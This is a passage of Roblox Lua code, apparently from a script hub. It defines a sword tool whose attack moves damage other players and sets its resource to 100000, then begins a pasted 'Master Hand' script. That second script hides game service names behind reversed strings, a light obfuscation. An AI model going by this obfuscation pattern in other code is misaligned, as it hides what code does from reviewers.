		bould.Elasticity = 0 bould.Friction = 2 bould.CFrame = cf(Torso.Position.x+(math.random(-14,14)),Torso.Position.y-5,Torso.Position.z+(math.random(-14,14))) *CFrame.Angles(math.random(-33,33)/10,math.random(-33,33)/10,math.random(-33,33)/10)
		local warpdes = true
		local bpos = bould.Position
		Sound(Sounds.Cast,0.95,0.8)
		coroutine.resume(coroutine.create(function() repeat Functions.BrickWarpDesign(bould,9) wait() until warpdes == false end))
		for i=0,1,0.08 do bould.CFrame = CFrame.new(bpos.x,bpos.y,bpos.z) + Vector3.new(0,20*i,0) wait() end wait(1) bould.CFrame = CFrame.new(bpos.x,bpos.y+20,bpos.z) bould.CFrame = cf(bould.Position,mouse.hit.p)
		bould.Anchored = false wait() bould.Velocity = bould.CFrame.lookVector *(math.random(180,350)) bould.Touched:connect(function(hit) Functions.BoulderTouch(hit,bould) end)
		wait(0.5)
		warpdes = false
		game.Debris:AddItem(bould,10)
		for i=i2,i1,-is do
			LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(40+(-40*i)),0)
			LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(50*i),0)
			RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(-40+(40*i)),0)
			RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-50*i),0)
			Torw.C1 = ca(0,mr(50*i),0)
			wait()
		end
		Torw.C1 = ca(0,0,0)
		Anim.Act = false
	end
	Anims.ForceWave = function(i1,i2,is,RaigCost)
		local Hit, hitpos = rayCast(Torso.Position,((Torso.Position - Vector3.new(0,10000,0)) - Torso.Position),999.999,Player.Character)
		if Hit == nil then Anim.Act = false return end
		MinusRage(RaigCost)
		Anim.Act = true
		lh2,rh2 = FeetWeld(true,Lh,Rh)
		local bp2 = Instance.new("BodyPosition",Torso)
		bp2.maxForce = Vector3.new(0,math.huge,0)
		Humanoid.WalkSpeed = Humanoid.WalkSpeed - (RealSpeed-4)
		DebounceSpeed = DebounceSpeed + (1.1*Speed)
		bp2.position = Torso.Position + Vector3.new(0,25,0)
		Dash(Blad1,2.5/Speed)
		Dash(Blad2,2.5/Speed)
		local wav = p(Torm,"Block",0.1,0.1,0.1,true,false,0.3,0,BladeColor) wav.Anchored = true
		local wavm = BlastMesh:Clone()
		wavm.Parent = wav
		wavm.Scale = Vector3.new(15,6,15)
		local cff = Torso.CFrame - Vector3.new(0,0,0)
		coroutine.resume(coroutine.create(function()
			Dash(Blad1,4/Speed)
			Dash(Blad2,4/Speed)
			for i=i1,i2,is*Speed do
				LW.C1 = ca(mr(-80+(-100*i)),mr(40-(40*i)),mr(45*i))
				LW.C0 = cf(0.6,0.3+(1.4*i),-1+(1*i))
				RW.C1 = ca(mr(-80+(-100*i)),mr(-40+(40*i)),mr(-45*i))
				RW.C0 = cf(-0.6,0.3+(1.4*i),-1+(1*i))
				lh2.C1 = ca(mr(30*i),0,mr(15*i))
				rh2.C1 = ca(mr(30*i),0,mr(-15*i))
				lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
				rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
				H1w.C0 = cf(0,-1.1+(-0.9*i),0) *ca(0,mr(360*i),0)
				H1w.C1 = ca(mr(-90+(40*i)),0,0)
				wait()
			end for i=i1,i2*3,is*Speed do H1w.C1 = ca(mr(-50),mr(360*i),0) wait() end end)) Sound(Sounds.Cast,0.45,1) for i=i1,i2*5,is do Functions.BrickWarpDesign(Torso,13) wav.CFrame = cff *ca(0,mr(180*i),0) wait() end
		for i=1,0.3,-0.14*Speed do wav.Transparency = i wait() end wav:Remove()
		for i=i2,i1,-is*Speed do
			LW.C1 = ca(mr(-80+(-100*i)),mr(40-(40*i)),mr(45*i))
			LW.C0 = cf(0.6,0.3+(1.4*i),-1+(1*i))
			RW.C1 = ca(mr(-80+(-100*i)),mr(-40+(40*i)),mr(-45*i))
			RW.C0 = cf(-0.6,0.3+(1.4*i),-1+(1*i))
			lh2.C1 = ca(mr(30*i),0,mr(15*i))
			rh2.C1 = ca(mr(30*i),0,mr(-15*i))
			lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
			rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
			H1w.C0 = cf(0,-1.1+(-0.9*i),0) *ca(0,mr(360*i),0)
			H1w.C1 = ca(mr(-90+(40*i)),0,0)
			wait()
		end
		bp2:Remove()
		local bg = Instance.new("BodyGyro",Torso) bg.maxTorque = Vector3.new(math.huge,0,math.huge)
		local bp = Instance.new("BodyPosition",Torso) bp.position = Torso.Position bp.maxForce = Vector3.new(math.huge,1000000,math.huge)
		rpos = math.abs(hitpos.y - Torso.Position.y)
		rpos = rpos - 1.2
		local tpos = Torso.Position
		Hum.WalkSpeed = 0
		Hum.PlatformStand = true
		Dash(Blad2,1.6/Speed,RingMesh.MeshId)
		for i=i1,i2,is do
			bp.position = tpos - Vector3.new(0,rpos*i,0)
			Neck.C0 = cf(0,1-(0.5*i),-0.5*i) *ca(Neck.C1:toEulerAnglesXYZ())
			Torw.C1 = ca(mr(20*i),0,0)
			Torw.C0 = cf(0,-0.2*i,-0.2*i)
			lh2.C0 = cf(-0.5,-1.9+(1*i),-1.1*i) *ca(mr(10*i),mr(90),0)
			rh2.C0 = cf(0.5,-1.9+(1*i),0.1*i) *ca(mr(-95*i),mr(-90),0)
			LW.C1 = ca(mr(-80+(30*i)),mr(40),0)
			LW.C0 = cf(0.6,0.3-(0.3*i),-1+(0.3*i))
			RW.C1 = ca(mr(-80+(30*i)),mr(-40),0)
			RW.C0 = cf(-0.6,0.3-(0.3*i),-1+(0.3*i))
			H1w.C0 = cf(0,-1.1,0) *ca(mr(55*i),0,0)
			wait()
		end
		wait(0.25)
		Sound(Sounds.Boom,0.5,1)
		Sound(Sounds.EnergyBlast,0.9,1)
		Right = true
		ShockWave(Torso,50,BladeColor)
		wait(1.5)
		Right = false
		local t2pos = Torso.Position
		for i=i2,i1,-is do
			bp.position = t2pos - Vector3.new(0,1.5-(1.5*i),0)
			Neck.C0 = cf(0,1-(0.5*i),-0.5*i) *ca(Neck.C1:toEulerAnglesXYZ())
			Torw.C1 = ca(mr(20*i),0,0)
			Torw.C0 = cf(0,-0.2*i,-0.2*i)
			lh2.C0 = cf(-0.5,-1.9+(1*i),-1.1*i) *ca(mr(10*i),mr(90),0)
			rh2.C0 = cf(0.5,-1.9+(1*i),0.1*i) *ca(mr(-95*i),mr(-90),0)
			LW.C1 = ca(mr(-80+(30*i)),mr(40),0)
			LW.C0 = cf(0.6,0.3-(0.3*i),-1+(0.3*i))
			RW.C1 = ca(mr(-80+(30*i)),mr(-40),0)
			RW.C0 = cf(-0.6,0.3-(0.3*i),-1+(0.3*i))
			H1w.C0 = cf(0,-1.1,0) *ca(mr(55*i),0,0)
			wait()
		end
		DebounceSpeed = DebounceSpeed - (1.1*Speed)
		bp:Remove()
		bg:Remove()
		Hum.PlatformStand = false
		Hum.WalkSpeed = RealSpeed
		Torw.C1 = ca(0,0,0)
		Anim.Act = false
		Lh,Rh = FeetWeld(false,lh2,rh2)
	end
	Anims.DualSpin = function(i1,i2,is,RaigCost)
		MinusRage(RaigCost)
		Anim.Act = true
		for i=i1,i2,is*Speed do
			H1w.C0 = cf(0,-1.1,0) *ca(0,mr(-180-(-90*i)),mr(0*i)) H1w.C1 = ca(mr(-90-(60*i)),0,mr(0*i))
			H2w.C0 = cf(0,-1.1,0) *ca(0,mr(180-(270*i)),mr(0*i)) H2w.C1 = ca(mr(-90+(-30*i)),0,0)
			LW.C1 = ca(mr(-60+(-40*i)),mr(-30+(-75*i)),mr(0*i))
			LW.C0 = cf(0.13*i,0.5*i,-0.5+(0.5*i))
			RW.C1 = ca(mr(-60+(-20*i)),mr(30+(45*i)),mr(0*i))
			RW.C0 = cf(0.13*i,0.4*i,-0.5+(0.4*i))
			wait()
		end
		DebounceSpeed = DebounceSpeed - (0.5*Speed) Right = true Left = true Dash(Blad1,2.6/Speed,nil,2) Dash(Blad2,2.6/Speed,nil,2) local x,y,z = Neck.C0:toEulerAnglesXYZ()
		local soundtime = 0
		for i=i1,i2*4,is*Speed do if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end Torw.C1 = ca(0,mr(i*360),0) Neck.C0 = cf(0,1,0) *ca(x,y,z+mr(-360*i)) wait() end Neck.C0 = cf(0,1,0) *ca(x,y,z)Torw.C1 = ca(0,0,0)
		DebounceSpeed = DebounceSpeed + (0.5*Speed) for i=i2,i1,-is*Speed do
			H1w.C0 = cf(0,-1.1,0) *ca(0,mr(-180-(-90*i)),mr(0*i)) H1w.C1 = ca(mr(-90-(60*i)),0,mr(0*i))
			H2w.C0 = cf(0,-1.1,0) *ca(0,mr(180-(270*i)),mr(0*i)) H2w.C1 = ca(mr(-90+(-30*i)),0,0)
			LW.C1 = ca(mr(-60+(-40*i)),mr(-30+(-75*i)),mr(0*i))
			LW.C0 = cf(0.13*i,0.5*i,-0.5+(0.5*i))
			RW.C1 = ca(mr(-60+(-20*i)),mr(30+(45*i)),mr(0*i))
			RW.C0 = cf(0.13*i,0.4*i,-0.5+(0.4*i))
			wait()
		end Right = false Left = false
		Anim.Act = false
	end

	----------------------------
	----------------------------
	----------------------------
	----------------------------

	Lh = Torso["Left Hip"]
	Rh = Torso["Right Hip"]

	Functions = {}
	Functions.BoulderTouch = function(hit2,bould)
		print(bould.Name)
		for i,v in pairs(workspace:GetChildren()) do
			if v ~= Char and v ~= nil and v:findFirstChild("Torso") ~= nil and v:findFirstChild("Humanoid") ~= nil then
				if math.abs((v.Torso.Position-bould.Position).magnitude) < 11 and ft(RightDebounce,v.Name) == nil then
					Sound(Sounds.Smash,1,1)
					Dmgz(v.Humanoid,Damage["BoulderForce"])
					table.insert(RightDebounce,v.Name)
					print(v.Name)
					coroutine.resume(coroutine.create(function()wait(DebounceSpeed) local nf = ft(RightDebounce,v.Name) if nf ~= nil then table.remove(RightDebounce,nf) end end))
				end
			else
				if v ~= bould and v:IsA("BasePart") and v.Anchored == false and math.abs((v.Position-bould.Position).magnitude) < 11 then v:BreakJoints() v.Velocity = cf(bould.Position,v.Position).lookVector*10 + Vector3.new(0,10,0) end
			end
		end -- for
	end
	Functions.Sparkle = function(bb,scal,si)
		if si == nil then si = 1 end
		local rand = bb.Position + Vector3.new(math.random(-scal,scal),math.random(-scal,scal),math.random(-scal,scal))
		local np = p(Torm,"Block",0.1,0.1,0.1,false,true,0.1,0.2,BladeColor)
		np.CFrame = cf(rand.x,rand.y,rand.z) *ca(math.random(-33,33)/10,math.random(-33,33)/10,math.random(-33,33)/10)
		local dm = DiamondMesh:Clone() dm.Scale = Vector3.new(0,0,0) dm.Parent = np
		coroutine.resume(coroutine.create(function()
			for i=0,1*si,0.1*si do
				dm.Scale = Vector3.new(1*i,1.25*i,1*i)
				wait()
			end
		end))
		coroutine.resume(coroutine.create(function()
			wait(0.1)
			for i=0,1,0.1 do
				np.Transparency = i
				wait()
			end
			np:Remove()
		end))
	end
	Functions.BrickWarpDesign = function(bb,scal)
		local rand = bb.Position + Vector3.new(math.random(-scal,scal),math.random(-scal,scal),math.random(-scal,scal))
		local mag = (rand - bb.Position).magnitude
		local np = p(Torm,"Block",0.1,0.1,mag-3,false,true,0.1,0.2,BladeColor)
		np.CFrame = cf(bb.Position,rand)
		np.CFrame = np.CFrame + np.CFrame.lookVector*((scal/5)+(mag/2))
		coroutine.resume(coroutine.create(function()
			for i=0.1,1,0.05 do
				np.Transparency = i
				wait()
			end
			np:Remove()
		end))
	end
	Functions.RageRegen = function()
		local lostcontrol = false
		local hpos = Torso.Position.y + 10
		Anim.Move = "RageRegening"
		Anim.Act = true
		local wav = p(Torm,"Block",0.1,0.1,0.1,true,false,1,0,BladeColor) wav.Anchored = true
		local wavm = BlastMesh:Clone()
		wavm.Parent = wav
		local wavv = 0
		wavm.Scale = Vector3.new(5,3.5,5)
		wav.CFrame = cf((Torso.CFrame * CFrame.new(0,-2.5,0)).p) *ca(0,mr(wavv),0)
		local bp = Instance.new("BodyPosition",Torso)
		bp.maxForce = Vector3.new(0,math.huge,0)
		Humanoid.WalkSpeed = Humanoid.WalkSpeed - (RealSpeed-4)
		bp.position = Torso.Position + Vector3.new(0,10,0)
		local bpos = bp.position
		coroutine.resume(coroutine.create(function()
			lh2,rh2 = FeetWeld(true,Lh,Rh)
			if SwordType == "Single" then
				for i=0,1,0.1*Speed do
					LW.C1 = ca(mr(-80+(-30*i)),mr(40-(40*i)),0)
					LW.C0 = cf(0.6-(0.6*i),0.3+(0.5*i),-1+(1.7*i)) *ca(0,mr(120*i),0)
					RW.C1 = ca(mr(-80+(-30*i)),mr(-40+(40*i)),0)
					RW.C0 = cf(-0.6+(0.6*i),0.3+(0.5*i),-1+(1.7*i)) *ca(0,mr(-120*i),0)
					lh2.C1 = ca(mr(30*i),0,mr(15*i))
					rh2.C1 = ca(mr(30*i),0,mr(-15*i))
					lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
					rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
					wait()
				end
			else
				for i=0,1,0.1*Speed do
					LW.C1 = ca(mr(-60+(-50*i)),mr(-40-(-40*i)),0)
					LW.C0 = cf(-0.1,0.8*i,-0.5+(1.2*i)) *ca(0,mr(120*i),0)
					RW.C1 = ca(mr(-60+(-50*i)),mr(40+(-40*i)),0)
					RW.C0 = cf(0.1,0.8*i,-0.5+(1.2*i)) *ca(0,mr(-120*i),0)
					lh2.C1 = ca(mr(30*i),0,mr(15*i))
					rh2.C1 = ca(mr(30*i),0,mr(-15*i))
					lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
					rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
					wait()
				end
			end
			local function movezx(i1,i2,is,bp)
				if SwordType == "Single" then
					for i=i1,i2,is*Speed do
						LW.C1 = ca(mr(-120+(20*i)),0,0)
						LW.C0 = cf(0,0.8,0.7) *ca(0,mr(120+(20*i)),0)
						RW.C1 = ca(mr(-120+(20*i)),0,0)
						RW.C0 = cf(0,0.8,0.7) *ca(0,mr(-120+(-20*i)),0)
						lh2.C1 = ca(mr(30+(-15*i)),0,mr(15+(-8*i)))
						rh2.C1 = ca(mr(30+(-15*i)),0,mr(-15+(8*i)))
						lh2.C0 = cf(-0.7,-1.9,0.35)
						rh2.C0 = cf(0.7,-1.9,0.35)
						bp.position = Vector3.new(bpos.x,(hpos+10)+(3*i),bpos.z)
						wait()
					end
				else
					for i=i1,i2,is*Speed do
						LW.C1 = ca(mr(-110),mr(0),0)
						LW.C0 = cf(-0.1,0.8,0.7) *ca(0,mr(120+(20*i)),0)
						RW.C1 = ca(mr(-110),mr(0),0)
						RW.C0 = cf(0.1,0.8,0.7) *ca(0,mr(-120+(-20*i)),0)
						lh2.C1 = ca(mr(30+(-15*i)),0,mr(15+(-8*i)))
						rh2.C1 = ca(mr(30+(-15*i)),0,mr(-15+(8*i)))
						lh2.C0 = cf(-0.7,-1.9,0.35)
						rh2.C0 = cf(0.7,-1.9,0.35)
						bp.position = Vector3.new(bpos.x,(hpos+10)+(3*i),bpos.z)
						wait()
					end
				end
			end
			local moved = 2
			repeat
				if Rage >= MaxRage or Anim.key.z == false then break end
				if moved == 2 then moved = 1 movezx(0,1,0.025,bp) else moved = 2 movezx(1,0,-0.025,bp) end
			until Rage >= MaxRage or Anim.key.z == false or lostcontrol == true
			if SwordType == "Single" then
				for i=1,0,-0.1*Speed do
					LW.C1 = ca(mr(-80+(-30*i)),mr(40-(40*i)),0)
					LW.C0 = cf(0.6-(0.6*i),0.3+(0.5*i),-1+(1.7*i)) *ca(0,mr(120*i),0)
					RW.C1 = ca(mr(-80+(-30*i)),mr(-40+(40*i)),0)
					RW.C0 = cf(-0.6+(0.6*i),0.3+(0.5*i),-1+(1.7*i)) *ca(0,mr(-120*i),0)
					lh2.C1 = ca(mr(30*i),0,mr(15*i))
					rh2.C1 = ca(mr(30*i),0,mr(-15*i))
					lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
					rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
					wait()
				end
			else
				for i=1,0,-0.1*Speed do
					LW.C1 = ca(mr(-60+(-50*i)),mr(-40-(-40*i)),0)
					LW.C0 = cf(-0.1,0.8*i,-0.5+(1.2*i)) *ca(0,mr(120*i),0)
					RW.C1 = ca(mr(-60+(-50*i)),mr(40+(-40*i)),0)
					RW.C0 = cf(0.1,0.8*i,-0.5+(1.2*i)) *ca(0,mr(-120*i),0)
					lh2.C1 = ca(mr(30*i),0,mr(15*i))
					rh2.C1 = ca(mr(30*i),0,mr(-15*i))
					lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
					rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
					wait()
				end
			end
			Lh,Rh = FeetWeld(false,lh2,rh2)
			wait(0.6)
			Anim.Act = false
			Anim.Move = "None"
		end))
		for i=1,0.3,-0.14*Speed do wav.Transparency = i wait() end
		rpos = 0
		Sound(Sounds.Cast,0.8,1)
		repeat wait()
			local Hit, hitpos = rayCast(Torso.Position,((Torso.Position - Vector3.new(0,10000,0)) - Torso.Position),999.999,Player.Character)
			if Hit == nil then lostcontrol = true break end
			hpos = hitpos.y if math.random(1,6) == 4 then Functions.Sparkle(Torso,8) end
			if math.random(1,3) == 3 then Functions.BrickWarpDesign(Torso,10) end wavv = wavv + 10 Rage = Rage - (RageCost["RageRegening"]*RageIncome)
			wav.CFrame = cf(Torso.Position.x,hpos+1.4,Torso.Position.z) *ca(0,mr(wavv),0)
		until Rage >= MaxRage or Anim.key.z == false
		for i=0.3,01,0.14*Speed do wav.Transparency = i wait() end wav:Remove()
		bp:Remove()
		Humanoid.WalkSpeed = Humanoid.WalkSpeed + (RealSpeed-4)
	end
	Functions.Teleport = function(i1,i2,is,RaigCost)
		Anim.Act = true
		for i=i1,i2,is*Speed do
			LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(40+(-40*i)),0)
			LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(50*i),0)
			RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(-40+(40*i)),0)
			RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-50*i),0)
			Torw.C1 = ca(0,mr(50*i),0)
			wait()
		end
		local tele = false
		local tele2 = false -- for mouse
		local mouseact = mouse.Button1Up:connect(function() tele2 = true end)
		coroutine.resume(coroutine.create(function() Sound(Sounds.Cast,1.2,1) wait(12) tele = true end))
		local telepos = Torso.Position
		local telehit = nil
		local wav = p(Torm,"Block",0.1,0.1,0.1,true,false,0.3,0.1,BladeColor) wav.Anchored = true
		local wavm = BlastMesh:Clone()
		wavm.Parent = wav
		local wavv = 0
		wavm.Scale = Vector3.new(3.5,2,3.5)
		repeat
			local mpos = mouse.hit.p + Vector3.new(0,2,0)
			telehit,telepos = rayCast(mpos,((mpos - Vector3.new(0,10000,0)) - mpos),999.999,Player.Character)
			wavv = wavv + 8 Functions.Sparkle(La,3) Functions.BrickWarpDesign(La,4)
			if telehit ~= nil then wav.Transparency = 0 wav.CFrame = cf(telepos.x,telepos.y+1,telepos.z) *ca(0,mr(wavv),0) else wav.Transparency = 1 end
			wait() until tele == true or tele2 == true mouseact:disconnect()
		if telehit == nil or math.abs((Torso.Position - telepos).magnitude) > Props.MaxTeleDistance then
			Sound(Sounds.Punch,1,1) for i=0.3,1,0.14 do wavm.Scale = Vector3.new(3.5+(5*i),2,3.5+(5*i)) wav.Transparency = i wait() end wav:Remove()
			wav:Remove()
		else
			MinusRage(RaigCost)
			for i=1,10 do wait() Functions.Sparkle(Torso,5,3) Functions.BrickWarpDesign(Torso,6) end
			ShockWave(Torso,7,BladeColor)
			Torso.CFrame = wav.CFrame + Vector3.new(0,2.2,0) Sound(Sounds.EnergyBlast,1.2,0.6)
			ShockWave(Torso,7,BladeColor)
			for i=1,10 do wait() Functions.Sparkle(Torso,5,3) Functions.BrickWarpDesign(Torso,6) end
			for i=0.3,1,0.14 do wavm.Scale = Vector3.new(3.5+(5*i),2,3.5+(5*i)) wav.Transparency = i wait() end wav:Remove()
		end
		for i=i2,i1,-is*Speed do
			LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(40+(-40*i)),0)
			LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(50*i),0)
			RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(-40+(40*i)),0)
			RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-50*i),0)
			Torw.C1 = ca(0,mr(50*i),0)
			wait()
		end
		Anim.Act = false
	end

	--------------------------------------------------------------------------------------------------------------
	--------------------------------------------------------------------------------------------------------------
	--------------------------------------------------------------------------------------------------------------
	--------------------------------------------------------------------------------------------------------------
	bin.Selected:connect(function(mm)
		Mouse = mouse
		mouse = mm
		Torso["Left Hip"].Part0 = Tor
		Torso["Right Hip"].Part0 = Tor
		RS.Parent = nil
		LS.Parent = nil
		RW.Parent = Torso
		RW.Part0 = Fra
		RW.Part1 = Ra
		LW.Parent = Torso
		LW.Part0 = Fla
		LW.Part1 = La
		RW.C0 = CFrame.new(0,0,0) RW.C1 = CFrame.new(0,0,0)
		LW.C0 = CFrame.new(0,0,0) LW.C1 = CFrame.new(0,0,0)
		Anims.Equip(0,1,0.07*Speed)
		Anim.Equipped = true
		mouse.KeyDown:connect(function(key)
			key:lower()
			pcall(function() Anim.key[key:lower()] = true end)
			keydown = true
			if key == "z" and Anim.Move == "None" and not Anim.Act then
				Functions.RageRegen()
			end
			if SwordType == "Single" then
				if key == "e" and Anim.Move == "None" and not Anim.Act and RageCost["RotorBlade"] <= Rage then
					Anim.Move = "RotorBlade"
					Anims.RotorBlade(0,1,0.08*Speed,RageCost["RotorBlade"])
					Anim.Move = "None"
				elseif key == "q" and Anim.Move == "None" and not Anim.Act and RageCost["Boomerang"] <= Rage then
					Anim.Move = "Boomerang"
					Anims.Boomerang(0,1,0.08*Speed,RageCost["Boomerang"])
					Anim.Move = "None"
				elseif key == "f" and Anim.Move == "None" and not Anim.Act and RageCost["BoulderForce"] <= Rage then
					Anim.Move = "BoulderForce"
					Anims.BoulderForce(0,1,0.08*Speed,RageCost["BoulderForce"])
					Anim.Move = "None"
				elseif key == "r" and Anim.Move == "None" and not Anim.Act and RageCost["ForceWave"] <= Rage then
					Anim.Move = "ForceWave"
					Anims.ForceWave(0,1,0.08*Speed,RageCost["ForceWave"])
					Anim.Move = "None"
				elseif key == "t" and Anim.Move == "None" and not Anim.Act and RageCost["Teleport"] <= Rage then
					Anim.Move = "Teleport"
					Functions.Teleport(0,1,0.08*Speed,RageCost["Teleport"])
					Anim.Move = "None"
				end
			elseif SwordType == "Dual" then
				if key == "e" and Anim.Move == "None" and not Anim.Act and RageCost["DualSpin"] <= Rage then
					Anim.Move = "DualSpin"
					Anims.DualSpin(0,1,0.08*Speed,RageCost["DualSpin"])
					Anim.Move = "None"
				end
			end
		end)
		mouse.KeyUp:connect(function(key)
			pcall(function() Anim.key[key:lower()] = false end)
			keydown = false
		end)

		mouse.Button1Down:connect(function() Anim.Button = true
			if not Anim.Click and Anim.Move == "None" and not Anim.Act then
				Anim.Click = true
				if Anim.CanBerserk ~= 0 then Anim.CanBerserk = Anim.CanBerserk + 1 end
				if Anim.CanBerserk == 0 and RageCost["Berserk"] <= Rage then
					Rage = Rage - RageCost["Berserk"]
					Anim.ComboBreak = true
					Speed = Speed + 0.5
					Anim.CanBerserk = Anim.CanBerserk + 1
					--Anim.Move = "LeftPunch"
					--Anims.LeftPunch(0,1,0.1*Speed,0) Anim.Move = "None"
				elseif Anim.CanBerserk == 2 then
					Anim.CanBerserk = 0
				end
				coroutine.resume(coroutine.create(function() local oldcomb = Anim.CanBerserk wait(0.5) if Anim.ComboBreak == true and Anim.CanBerserk == oldcomb then Anim.ComboBreak = false Speed = Speed -0.5 Anim.CanBerserk = 0 end end))
				wait(0.1)
				Anim.Click = false
			end
		end)
		mouse.Button1Up:connect(function() Anim.Button = false
		end)
	end)
	bin.Deselected:connect(function(mouse)
		Anim.Equipped = false
		if SwordType == "Dual" then Anims.ChangeToSingle(0,1,0.25*Speed) SwordType = "Single" end
		Anims.UnEquip(1,0,-0.08*Speed)
		RW.Parent = nil
		LW.Parent = nil
		RS.Parent = Torso
		RS.Part0 = Torso
		RS.Part1 = Ra
		LS.Parent = Torso
		LS.Part0 = Torso
		LS.Part1 = La
		if Rh.Parent == nil then
			FeetWeld(false,Lh,Rh)
		end
		Torso["Left Hip"].Part0 = Torso
		Torso["Right Hip"].Part0 = Torso
	end)
	Hum.WalkSpeed = RealSpeed
	Rage = 100000
	wait(5)
end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Master Hand"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Master Hand"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	--MADE BY OneLegend (NOT THE SCRIPT) LOCAL SCRIPT: Go down to line 23 and put your name where it says "YOUR NAME HERE"


	wt  = 0.05 s = script it = Instance.new v3 = Vector3.new c3 = Color3.new ud =  UDim2.new cf = CFrame.new ca = CFrame.Angles pi = math.pi rd = math.rad
	bc =  BrickColor.new ab = math.abs de = math.deg ts = tostring tn = tonumber ti =  table.insert tr = table.remove 
	cr = coroutine.resume cc =  coroutine.create
	asset = "http://www.roblox.com/asset/?id="
	sr =  string.reverse sl = string.lower su = string.upper 
	Serv = {} Serv.p =  game:GetService(sr("sreyalP")) Serv.l = game:GetService(sr("gnithgiL"))  
	Serv.is = game:GetService(sr("ecivreStresnI")) if  game:findFirstChild(sr("revreSkrowteN")) then Serv.ns =  game:GetService(sr("revreSkrowteN")) else NetworkServer = nil end 
	Serv.sg =  game:GetService(sr("iuGretratS")) Serv.sp = game:GetService(sr("kcaPretratS"))  Serv.d = game:GetService(sr("sirbeD"))
	Decs = {}
	Decs.Crack = "49173398"  Decs.Cloud = "1095708" Decs.Spike = "1033714" Decs.Rock = "1290033" Decs.Crown =  "1323306"
	function ft(tablez,item) if not tablez or not item then return nil  end for i=1,#tablez do if tablez == item then return i end end return nil  end
	function re(par,obj) if type(par) ~= "userdata" or type(obj) ~= "string"  then return nil end if par:findFirstChild(obj) then par[obj]:Remove() end end  
	function pa(pa,sh,x,y,z,c,a,tr,re,bc2) local fp = nil if sh ~= "Wedge" and  sh ~= "CornerWedge" then fp = it("Part",pa) fp.Shape = sh fp.formFactor =  "Custom" elseif sh == "Wedge" then fp = it("WedgePart",pa) fp.formFactor =  "Custom"
		elseif sh == "CornerWedge" then fp = it("CornerWedgePart",pa) end  fp.Size = v3(x,y,z) fp.CanCollide = c fp.Anchored = false fp.BrickColor =  bc(bc2) fp.Transparency = tr fp.Reflectance = re fp.BottomSurface =  0
		fp.TopSurface = 0 fp.CFrame = t.CFrame + Vector3.new(0,50,0) fp.Velocity =  Vector3.new(0,10,0) fp:BreakJoints() return fp end 
	function clearit(tab) for  xx=1,#tab do tab[xx]:Remove() end end 
	function weld(pa,p0,p1,x,y,z,a,b,c)  local fw = it("Weld",pa) fw.Part0 = p0 fw.Part1 = p1 fw.C0 = cf(x,y,z)  *ca(a,b,c) return fw end
	function spm(ty,pa,ss) local sp =  it("SpecialMesh",pa) sp.MeshType = ty sp.Scale = Vector3.new(ss,ss,ss) end  function mbm(pa,sx,sy,sz) local bm = Instance.new("BlockMesh",pa) bm.Scale =  Vector3.new(sx,sy,sz) end 
	function ra(mn,mx,dc) local tms = 1 if dc == nil  then dc = 0 end if type(dc) == "number" and dc > 5 then dc = 5 end for  zx=1,dc do tms = tms*10 end return math.random(mn*tms,mx*tms)/tms end 
	p  = Serv.p.LocalPlayer
	bp = p.Backpack
	pg = p.PlayerGui
	c =  p.Character
	he = c.Head
	t = c.Torso
	hu = c.Humanoid
	mou =  nil
	re(c,"Hand")
	s = 2

	--tool var
	Equip = false
	HTrans =  0
	HRef = 0
	HCol = "a"
	LaserCol = "Really black"
	LaserCol2 = "Really  red"
	LaserCol3 = "Really black"
	Posing = "Follow"
	Facing =  "Owner"
	Anim = {}
	Anim.a = "None"
	Anim.b = "None"
	Anim.Welding =  0
	local fingwide = 1.5*s
	local finghei = 2.8
	local tiphei =  2.55
	handoffset = v3(5,18,-8)*s
	bgx,bgy,bgz = -90,0,0
	w = {}
	Button  = false 
	--
	BlastMesh = it("FileMesh")
	BlastMesh.MeshId =  "http://www.roblox.com/asset/?id=20329976"
	RingMesh =  it("FileMesh")
	RingMesh.MeshId =  "http://www.roblox.com/asset/?id=3270017"
	RockMesh =  it("FileMesh")
	DiamondMesh = it("FileMesh")
	DiamondMesh.MeshId =  "http://www.roblox.com/Asset/?id=9756362"

	m = Instance.new("Model",c)  m.Name = "Hand"
	Palm =  pa(m,"Block",6*s,7*s,fingwide*2,true,false,HTrans,HRef,HCol)  mbm(Palm,1,1,0.6)
	local x,y,z =  Palm.Size.x,Palm.Size.y,Palm.Size.z
	bPoint1 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Point1 =  weld(bPoint1,Palm,bPoint1,-x/2+(fingwide/2),y/2,0,0,0,0)
